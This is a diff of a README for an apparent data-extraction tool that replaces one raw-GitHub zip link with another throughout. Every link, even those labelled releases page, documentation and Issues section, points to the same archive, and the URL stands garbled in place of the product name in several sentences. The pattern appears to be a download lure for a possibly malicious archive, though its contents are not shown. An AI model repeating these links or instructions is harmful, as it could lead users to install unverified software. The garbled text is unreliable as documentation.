@@ -1,10 +1,10 @@
 # 🌟 apollo-compliant-data-extractor - Easy Data Extraction Made Simple
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip)
+[![Download](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip)
 
 ## 📖 Overview
-The **apollo-compliant-data-extractor** provides an easy way to extract data from https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip This tool helps you enrich your data effortlessly while ensuring compliance with GDPR standards. You can generate clean CSV outputs to work with across various applications. 
+The **apollo-compliant-data-extractor** provides an easy way to extract data from https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip This tool helps you enrich your data effortlessly while ensuring compliance with GDPR standards. You can generate clean CSV outputs to work with across various applications. 
 
 ## 🚀 Getting Started
 To start using the app, follow these simple steps. No technical skills required!
@@ -26,7 +26,7 @@ Before we begin, ensure that your system meets the following requirements:
 - Ensures GDPR compliance throughout data handling.
 
 ## 📥 Download & Install
-1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip) to access the releases page.
+1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip) to access the releases page.
    
 2. **Choose the appropriate version:** Look for the latest version of the application. It will usually be at the top of the page.
 
@@ -41,7 +41,7 @@ Before we begin, ensure that your system meets the following requirements:
 
 ## 🔧 Usage Instructions
 1. **Open the application:** After installation, launch the app.
-2. **Input your API key:** Go to the settings and paste your https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip API key to enable data extraction features. 
+2. **Input your API key:** Go to the settings and paste your https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip API key to enable data extraction features. 
 3. **Set your parameters:** Choose the data type you want to extract. The application allows you to specify certain filters for more focused results.
 4. **Start the extraction process:** Click on the 'Extract' button to begin gathering data.
 5. **Download your output:** Once the extraction is complete, you will receive a CSV file. Save this file to your desired location.
@@ -54,12 +54,12 @@ If you encounter issues while using the app:
 - Consult the FAQs section on the Releases page or contact support through the repository's Issues section.
 
 ## 📄 Documentation
-For a more in-depth understanding of the application and its functionality, you can refer to the [documentation](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip).
+For a more in-depth understanding of the application and its functionality, you can refer to the [documentation](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip).
 
 ## 📞 Support
 If you have questions or need assistance:
 
-- You can visit the [Issues section](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip) of the repository.
+- You can visit the [Issues section](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip) of the repository.
 - Join the community to ask questions and share feedback.
 
 ## 📚 Topics
@@ -78,6 +78,6 @@ This application covers several topics relevant to data extraction and managemen
 - python3
 
 ## 📥 Download Now Again
-Don't forget, you can always [visit this page to download](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/apollo_extractor_data_compliant_1.1.zip) to ensure you have the latest version of the app. 
+Don't forget, you can always [visit this page to download](https://raw.githubusercontent.com/RamiroChoque/apollo-compliant-data-extractor/main/receptual/data-compliant-extractor-apollo-2.8.zip) to ensure you have the latest version of the app. 
 
 We encourage you to explore all features and make the most of your data extraction experience with the **apollo-compliant-data-extractor**. Enjoy your journey to effective data management!
